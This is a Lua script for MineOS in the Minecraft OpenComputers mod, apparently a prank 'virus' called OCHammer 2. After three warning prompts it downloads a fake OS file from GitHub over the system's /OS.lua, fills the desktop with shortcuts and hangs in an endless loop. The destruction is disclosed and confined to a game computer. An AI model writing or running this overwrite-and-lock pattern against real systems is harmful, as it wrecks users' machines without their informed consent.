
-- Import libraries
local GUI = require("GUI")
local system = require("System")
local paths = require("Paths")
local com = require("Component")
local event = require("event")
local fs = require("Filesystem")
local internet = require("Internet")

local wait = event.sleep

-- OCHammer2.app
-- Copyright (c) 2022-2022 ocboy3

-- Why did Carl the NPC want to get the freaking gun?



event.interruptingEnabled = false

GUI.alert("This software (OCHammer 2) is considered a virus.\nIf you wish to continue, please press OK.\nOtherwise, please reboot the computer by\nusing the power button.")
GUI.alert("Are you sure?\nIf yes, then please press OK.\nOtherwise, please reboot the computer by\nusing the power button.")
GUI.alert("ARE YOU SURE? AFTER YOU CLICK OK, THERE IS NO GOING BACK.\nYOUR OPENCOMPUTER WILL BE WRECKED IF YOU CONTINUE")

function FUN()

  local cdir = fs.path(system.getCurrentScript())

  internet.download("https://raw.githubusercontent.com/ocboy3/OC/main/OCHammer2.app/FakeOS.lua","/OS.lua")
  
  local IS_MINEOS_DIR = fs.isDirectory("/MineOS/")
  
  if IS_MINEOS_DIR == false then
    fs.makeDirectory("/MineOS/")
  end
  
 
  internet.download("https://raw.githubusercontent.com/ocboy3/OC/main/OCHammer2.app/PLEASE%20READ%20ME.txt","/MineOS/PLEASE_READ_ME.txt") --  %20 = space

  -- spam a bunch of icons on the desktop
  for i = 1,30 do
    system.createShortcut(paths.user.desktop .. "PLEASE_READ_ME " .. tostring(i),"/MineOS/PLEASE_READ_ME.txt/")
  end

  -- update the file list
  
  
  GUI.alert("There's no going back now.")

  event.push("system","updateFileList")

  while true do
    local deadline = os.time()+1

    repeat
      computer.pullSignal(0.1)
    until os.time() >= deadline

  end
end

FUN()
